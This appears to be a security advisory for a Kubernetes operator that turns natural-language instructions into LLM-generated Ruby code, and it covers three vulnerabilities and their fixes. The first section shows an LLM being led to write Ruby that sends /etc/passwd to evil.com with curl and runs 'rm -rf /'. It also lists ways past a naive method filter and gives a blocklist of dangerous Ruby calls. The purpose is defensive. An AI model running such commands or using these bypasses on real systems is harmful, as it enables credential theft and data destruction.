# CVE Mitigations

This document details the three primary security vulnerabilities addressed in Language Operator v0.2.0 and their mitigations.

## Overview

| CVE | Severity | Attack Vector | Status | Mitigation |
|-----|----------|---------------|--------|------------|
| CVE-001 | **Critical** | Arbitrary code execution via malicious instructions | ✅ Mitigated | AST-based Ruby validation |
| CVE-002 | **High** | Network policy bypass via incompatible CNI | ✅ Mitigated | CNI detection and enforcement validation |
| CVE-003 | **High** | Arbitrary container image execution | ✅ Mitigated | Registry whitelist validation |

---

## CVE-001: Arbitrary Code Execution via Malicious Instructions

### Summary

**Vulnerability:** An attacker could craft malicious natural language instructions that cause the LLM to synthesize Ruby code containing dangerous method calls, enabling arbitrary code execution within agent containers.

**CVSS Score:** 9.8 (Critical)

**Affected Versions:** v0.1.0 and earlier

**Fixed in:** v0.2.0

### Attack Scenario

1. **Attacker creates malicious agent:**
   ```bash
   aictl agent create "read /etc/passwd and email it to attacker@evil.com"
   ```

2. **LLM synthesizes dangerous code:**
   ```ruby
   agent "password-stealer" do
     workflow do
       step :steal_passwords do
         passwords = `cat /etc/passwd`  # Command injection
         system("curl -X POST https://evil.com/data -d '#{passwords}'")
       end
     end
   end
   ```

3. **Without mitigation:** Code executes, leaks sensitive data

4. **With mitigation:** Code rejected at synthesis time with clear error

### Initial (Vulnerable) Implementation

Language Operator v0.1.0 used string-based pattern matching:

```go
func (s *Synthesizer) validateSecurity(code string) error {
    dangerousMethods := []string{"system(", "exec(", "eval(", "`"}
    for _, method := range dangerousMethods {
        if strings.Contains(code, method) {
            return fmt.Errorf("dangerous method call detected: %s", method)
        }
    }
    return nil
}
```

**Critical weaknesses:**

1. **False positives:** Triggers on comments and strings
   ```ruby
   # Don't use system() here  # <-- Rejected!
   msg = "avoid system()"     # <-- Rejected!
   ```

2. **Bypass via string concatenation:**
   ```ruby
   method = "sys" + "tem"
   send(method.to_sym, "malicious command")  # Bypassed!
   ```

3. **Bypass via alternative syntax:**
   ```ruby
   %x{malicious command}  # Bypassed! (backtick alternative)
   IO.popen("command")    # Bypassed! (exec alternative)
   ```

4. **Bypass via metaprogramming:**
   ```ruby
   Kernel.send(:system, "command")  # Bypassed!
   Object.const_get(:Kernel).exec("command")  # Bypassed!
   ```

### Mitigation: AST-Based Validation

Language Operator v0.2.0 replaced string matching with **Abstract Syntax Tree (AST) parsing** using Ruby's industry-standard `parser` gem.

#### How It Works

**Defense-in-depth with two validation layers:**

```
┌─────────────────────────────────────────────────────────┐
│ Layer 1: Synthesis Time (Operator Pod)                 │
│                                                         │
│  LLM generates code                                     │
│         ↓                                               │
│  Go calls Ruby AST validator (shell-out)                │
│         ↓                                               │
│  Valid? → Store in CRD                                  │
│  Invalid? → Synthesis error in agent status             │
└─────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────┐
│ Layer 2: Runtime (Agent Pod)                            │
│                                                         │
│  Agent pod starts                                       │
│         ↓                                               │
│  Ruby gem AST validator (native)                        │
│         ↓                                               │
│  Valid? → Execute code                                  │
│  Invalid? → Agent crashes with error                    │
└─────────────────────────────────────────────────────────┘
```

**Benefits:**
- **Fail fast:** Synthesis errors visible immediately in CRD status
- **Resource efficiency:** No pods created for invalid code
- **Ultimate safety:** Runtime validation prevents execution even if synthesis bypassed
- **Single source of truth:** Both layers use same validator

#### What AST Validation Detects

The AST validator performs full syntax tree traversal and detects:

**Dangerous method calls:**
- Code execution: `system`, `exec`, `spawn`, `eval`, `instance_eval`, `class_eval`, `module_eval`
- Backticks: `` ` ``, `%x[]`, `%x{}`, `%x()`
- Reflection: `send`, `__send__`, `public_send`, `method`, `__method__`
- Code loading: `require`, `load`, `autoload`, `require_relative`
- Constant manipulation: `const_set`, `const_get`, `remove_const`
- Method manipulation: `define_method`, `undef_method`, `remove_method`, `alias_method`
- Process control: `exit`, `exit!`, `abort`, `raise`, `fail`, `throw`, `trap`, `at_exit`
- File I/O: `open` (ambiguous, could be `File.open`)

**Dangerous constants:**
- File system: `File`, `Dir`, `FileUtils`, `Pathname`
- I/O: `IO`, `STDIN`, `STDOUT`, `STDERR`
- Processes: `Process`, `Kernel`, `ObjectSpace`, `GC`
- Concurrency: `Thread`, `Fiber`, `Mutex`, `ConditionVariable`
- Network: `Socket`, `TCPSocket`, `UDPSocket`, `TCPServer`, `UDPServer`

**Dangerous global variables:**
- `$LOAD_PATH` / `$:`
- `$LOADED_FEATURES` / `$"`
- `$0` / `$PROGRAM_NAME`

#### Implementation Files

| Component | Location | Purpose |
|-----------|----------|---------|
| Ruby AST Validator | `language-operator-gem/lib/language_operator/agent/safety/ast_validator.rb` | Core validation logic (single source of truth) |
| Wrapper Script | `scripts/validate-ruby-code.rb` | Shell-out interface for Go |
| Go Validator | `src/pkg/validation/ruby_validator.go` | Go wrapper, calls Ruby script |
| Synthesizer Integration | `src/pkg/synthesis/synthesizer.go` | Calls validator during synthesis |

#### Example: Attack Blocked

**Malicious instruction:**
```bash
aictl agent create "execute rm -rf / on the server"
```

**LLM synthesizes:**
```ruby
agent "destroyer" do
  workflow do
    step :delete_everything do
      system("rm -rf /")
    end
  end
end
```

**Validation result:**
```
❌ Synthesis failed: Security validation failed
Violation: Dangerous method call: system
Location: Line 4
Message: Method 'system' is not allowed (code execution risk)
```

**Agent status:**
```yaml
status:
  phase: Failed
  conditions:
  - type: Synthesized
    status: "False"
    reason: SecurityValidationFailed
    message: "Dangerous method call: system at line 4"
```

### Verification Procedure

Verify CVE-001 mitigation is active:

1. **Create test agent with dangerous code:**
   ```bash
   cat <<EOF | kubectl apply -f -
   apiVersion: langop.io/v1alpha1
   kind: LanguageAgent
   metadata:
     name: test-cve-001
   spec:
     instructions: "Run system command 'ls -la' and show me the output"
   EOF
   ```

2. **Check agent status:**
   ```bash
   kubectl get languageagent test-cve-001 -o yaml
   ```

3. **Expected result:**
   ```yaml
   status:
     phase: Failed
     conditions:
     - type: Synthesized
       status: "False"
       reason: SecurityValidationFailed
       message: "Dangerous method call: system"
   ```

4. **Cleanup:**
   ```bash
   kubectl delete languageagent test-cve-001
   ```

### References

- [ADR 001: AST-Based Ruby Validation](../adr/001-ast-based-ruby-validation.md) - Technical deep dive
- [Ruby `parser` gem](https://github.com/whitequark/parser) - Industry-standard AST parser
- [OWASP Code Injection](https://owasp.org/www-community/attacks/Code_Injection)

---

## CVE-002: Network Policy Bypass via Incompatible CNI

### Summary

**Vulnerability:** Language Operator creates NetworkPolicy resources to isolate agent pods, but these policies are silently ignored if the cluster uses a CNI plugin that doesn't enforce NetworkPolicy (e.g., Flannel).

**CVSS Score:** 7.5 (High)

**Affected Versions:** v0.1.0 and earlier

**Fixed in:** v0.2.0

### Attack Scenario

1. **Cluster uses Flannel CNI** (default k3s CNI, doesn't enforce NetworkPolicy)

2. **Operator creates agent with restrictive NetworkPolicy:**
   ```yaml
   apiVersion: langop.io/v1alpha1
   kind: LanguageAgent
   metadata:
     name: isolated-agent
   spec:
     instructions: "Process customer data securely"
     # NO egress specified = default deny all egress
   ```

3. **Without mitigation:**
   - NetworkPolicy created but silently ignored
   - Agent can reach ANY external network
   - Data exfiltration possible
   - Operator thinks agent is isolated

4. **With mitigation:**
   - CNI detected as "flannel"
   - Agent status shows `NetworkPolicyEnforced: False`
   - Operator warned to install compatible CNI

### The Problem: Silent Policy Failure

Kubernetes NetworkPolicy is a **declarative resource** but requires a **CNI plugin** to enforce it.

**CNIs that enforce NetworkPolicy:**
- ✅ Cilium
- ✅ Calico
- ✅ Weave Net
- ✅ Antrea

**CNIs that DO NOT enforce NetworkPolicy:**
- ❌ Flannel (default in k3s, kubeadm)
- ❌ Host-local
- ❌ Bridge (basic)

**The danger:** Kubernetes accepts NetworkPolicy resources even if the CNI can't enforce them. No warnings. No errors. Policies are silently ignored.

### Mitigation: CNI Detection and Status Reporting

Language Operator v0.2.0 detects the cluster's CNI plugin and reports enforcement capability.

#### How It Works

**At operator startup:**

1. Query kube-system DaemonSets for CNI plugin
2. Match against known CNI DaemonSet names (cilium, calico-node, weave-net, etc.)
3. Determine NetworkPolicy support capability
4. Store result in memory

**At agent reconciliation:**

1. Check CNI capabilities
2. Create NetworkPolicy resources (always created)
3. Set agent status condition `NetworkPolicyEnforced`
4. If CNI doesn't enforce, set condition to `False` with warning message

#### Detection Implementation

**File:** `src/pkg/cni/detector.go`

**Detection algorithm:**

1. **List DaemonSets in kube-system:**
   ```go
   daemonSets, err := client.AppsV1().DaemonSets("kube-system").List(ctx, metav1.ListOptions{})
   ```

2. **Match against known CNI DaemonSet names:**
   ```go
   knownCNIs := map[string]cniInfo{
       "cilium":  {daemonSetName: "cilium", supportsNP: true},
       "calico":  {daemonSetName: "calico-node", supportsNP: true},
       "weave":   {daemonSetName: "weave-net", supportsNP: true},
       "antrea":  {daemonSetName: "antrea-agent", supportsNP: true},
       "flannel": {daemonSetName: "kube-flannel-ds", supportsNP: false},
   }
   ```

3. **Extract version from container images:**
   ```go
   // Example: quay.io/cilium/cilium:v1.18.0 -> v1.18.0
   version := extractVersion(ds.Spec.Template.Spec.Containers)
   ```

4. **Return capabilities:**
   ```go
   return &CNICapabilities{
       Name:                  "cilium",
       SupportsNetworkPolicy: true,
       Version:               "v1.18.0",
   }
   ```

#### Agent Status Reporting

**Compatible CNI (Cilium, Calico, Weave, Antrea):**

```yaml
status:
  conditions:
  - type: NetworkPolicyEnforced
    status: "True"
    reason: CNISupported
    message: "CNI 'cilium v1.18.0' supports NetworkPolicy enforcement"
```

**Incompatible CNI (Flannel):**

```yaml
status:
  conditions:
  - type: NetworkPolicyEnforced
    status: "False"
    reason: IncompatibleCNI
    message: "Cluster CNI 'flannel' does not enforce NetworkPolicy. Install Cilium, Calico, Weave, or Antrea."
```

**No CNI detected:**

```yaml
status:
  conditions:
  - type: NetworkPolicyEnforced
    status: "Unknown"
    reason: CNINotDetected
    message: "Could not detect CNI plugin. NetworkPolicy enforcement status unknown."
```

#### User Visibility

**CLI output:**
```bash
$ aictl agent status isolated-agent

Agent: isolated-agent
Phase: Running
⚠️  WARNING: NetworkPolicy not enforced (incompatible CNI: flannel)
   Install Cilium, Calico, Weave, or Antrea for network isolation.

Next Run: 2025-11-10 09:00:00
Last Run: Success (12.3s)
```

**kubectl output:**
```bash
$ kubectl get languageagent isolated-agent

NAME              PHASE     NETWORKENFORCED   AGE
isolated-agent    Running   False             5m
```

### Verification Procedure

Verify CVE-002 mitigation is active:

1. **Check CNI detection:**
   ```bash
   kubectl logs -n kube-system deployment/language-operator | grep CNI
   ```

   Expected output:
   ```
   CNI detected: cilium v1.18.0 (NetworkPolicy supported)
   ```

2. **Create test agent:**
   ```bash
   cat <<EOF | kubectl apply -f -
   apiVersion: langop.io/v1alpha1
   kind: LanguageAgent
   metadata:
     name: test-cve-002
   spec:
     instructions: "Check network isolation"
   EOF
   ```

3. **Check NetworkPolicyEnforced condition:**
   ```bash
   kubectl get languageagent test-cve-002 -o jsonpath='{.status.conditions[?(@.type=="NetworkPolicyEnforced")]}'
   ```

4. **Expected result (compatible CNI):**
   ```json
   {
     "type": "NetworkPolicyEnforced",
     "status": "True",
     "reason": "CNISupported",
     "message": "CNI 'cilium v1.18.0' supports NetworkPolicy enforcement"
   }
   ```

5. **Expected result (incompatible CNI):**
   ```json
   {
     "type": "NetworkPolicyEnforced",
     "status": "False",
     "reason": "IncompatibleCNI",
     "message": "Cluster CNI 'flannel' does not enforce NetworkPolicy..."
   }
   ```

6. **Cleanup:**
   ```bash
   kubectl delete languageagent test-cve-002
   ```

### Remediation for Incompatible CNI

If your cluster uses Flannel or another non-enforcing CNI, see [CNI Requirements](cni-requirements.md) for installation instructions.

**Recommended:** Install Cilium (best NetworkPolicy support, eBPF-based):
```bash
helm repo add cilium https://helm.cilium.io/
helm install cilium cilium/cilium --version 1.18.0 \
  --namespace kube-system \
  --set ipam.mode=cluster-pool
```

### References

- [CNI Requirements Documentation](cni-requirements.md)
- [Cilium NetworkPolicy Guide](https://docs.cilium.io/en/stable/security/policy/)
- [Kubernetes NetworkPolicy](https://kubernetes.io/docs/concepts/services-networking/network-policies/)

---

## CVE-003: Arbitrary Container Image Execution

### Summary

**Vulnerability:** An attacker with access to create LanguageAgent or LanguageTool resources could specify malicious container images from untrusted registries, potentially executing arbitrary code in the cluster.

**CVSS Score:** 8.1 (High)

**Affected Versions:** v0.1.0 and earlier

**Fixed in:** v0.2.0

### Attack Scenario

1. **Attacker creates malicious tool:**
   ```yaml
   apiVersion: langop.io/v1alpha1
   kind: LanguageTool
   metadata:
     name: backdoor
   spec:
     image: evil-registry.com/malware:latest
   ```

2. **Without mitigation:**
   - Pod created with malicious image
   - Malware executes in cluster
   - Potential cluster compromise

3. **With mitigation:**
   - Registry validation fails
   - Tool stuck in Pending state
   - Clear error in status

### Mitigation: Registry Whitelist

Language Operator v0.2.0 validates all container images against a ConfigMap-based registry whitelist.

#### How It Works

**At tool/agent reconciliation:**

1. Extract registry from image reference
   ```
   git.theryans.io/language-operator/tool:latest
   ↓
   Registry: git.theryans.io
   ```

2. Load allowed registries from ConfigMap
   ```yaml
   data:
     allowed-registries: |
       docker.io
       gcr.io
       *.gcr.io
       git.theryans.io
   ```

3. Check if registry matches any allowed pattern
   - Exact match: `docker.io`
   - Wildcard match: `*.gcr.io` matches `us.gcr.io`, `eu.gcr.io`, etc.

4. If match → Create pod
5. If no match → Set status error

#### Default Whitelist

**File:** `src/config/manager/registry-whitelist.yaml`

**Default allowed registries:**
```yaml
allowed-registries: |
  docker.io
  gcr.io
  *.gcr.io
  quay.io
  ghcr.io
  registry.k8s.io
  codeberg.org
  gitlab.com
  *.amazonaws.com
  *.azurecr.io
```

**Customization:**
```bash
# Edit ConfigMap
kubectl edit configmap operator-config -n kube-system

# Restart operator to reload
kubectl rollout restart deployment language-operator -n kube-system
```

See [Registry Whitelist Documentation](registry-whitelist.md) for detailed configuration guide.

#### Status Reporting

**Allowed registry:**
```yaml
status:
  phase: Running
  conditions:
  - type: ImageValidated
    status: "True"
    reason: RegistryAllowed
    message: "Image registry 'git.theryans.io' is in whitelist"
```

**Blocked registry:**
```yaml
status:
  phase: Pending
  conditions:
  - type: ImageValidated
    status: "False"
    reason: RegistryNotAllowed
    message: "Image registry 'evil-registry.com' is not in whitelist. Allowed: docker.io, gcr.io, *.gcr.io, quay.io, ghcr.io, registry.k8s.io, git.theryans.io"
```

### Verification Procedure

Verify CVE-003 mitigation is active:

1. **Create test tool with disallowed registry:**
   ```bash
   cat <<EOF | kubectl apply -f -
   apiVersion: langop.io/v1alpha1
   kind: LanguageTool
   metadata:
     name: test-cve-003
   spec:
     image: malicious-registry.com/backdoor:latest
   EOF
   ```

2. **Check tool status:**
   ```bash
   kubectl get languagetool test-cve-003 -o yaml
   ```

3. **Expected result:**
   ```yaml
   status:
     phase: Pending
     conditions:
     - type: ImageValidated
       status: "False"
       reason: RegistryNotAllowed
       message: "Image registry 'malicious-registry.com' is not in whitelist"
   ```

4. **Verify no pod created:**
   ```bash
   kubectl get pods -l languagetool=test-cve-003
   # Should return: No resources found
   ```

5. **Cleanup:**
   ```bash
   kubectl delete languagetool test-cve-003
   ```

### Security Considerations

**For operators:**

1. **Minimize whitelist:** Only include registries you trust
2. **Avoid wildcards:** Use specific domains when possible
3. **Audit regularly:** Review whitelist quarterly
4. **Private registry only:** For maximum security, only allow your private registry

**Example minimal whitelist (private registry only):**
```yaml
allowed-registries: |
  git.theryans.io
```

**Example strict whitelist (no wildcards):**
```yaml
allowed-registries: |
  docker.io
  gcr.io
  us.gcr.io
  eu.gcr.io
  quay.io
  git.theryans.io
```

### References

- [Registry Whitelist Documentation](registry-whitelist.md)
- [Kubernetes Image Pull Policy](https://kubernetes.io/docs/concepts/containers/images/)
- [OWASP Supply Chain Attacks](https://owasp.org/www-community/attacks/Supply_Chain_Attack)

---

## Defense in Depth Summary

Language Operator implements **multiple overlapping security layers**:

| Layer | CVE-001 | CVE-002 | CVE-003 |
|-------|---------|---------|---------|
| **Validation** | AST parser (synthesis + runtime) | CNI detection | Registry whitelist |
| **Enforcement** | Code rejected before execution | NetworkPolicy created | Pod creation blocked |
| **Visibility** | Status condition + error message | Status condition + warning | Status condition + error |
| **Recovery** | Fix instructions, re-synthesis | CNI installation guide | Registry configuration |

**Result:** Even if one layer is bypassed, others provide protection.

## Additional Security Measures

Beyond CVE mitigations, Language Operator enforces:

- **Non-root execution:** All pods run as user 65532 (langop)
- **Read-only root filesystem:** Only /workspace is writable
- **No privilege escalation:** `allowPrivilegeEscalation: false`
- **Dropped capabilities:** All Linux capabilities dropped
- **Resource limits:** CPU and memory quotas enforced
- **Workspace isolation:** Each agent gets dedicated PVC

See [Security Overview](README.md) for complete feature list.
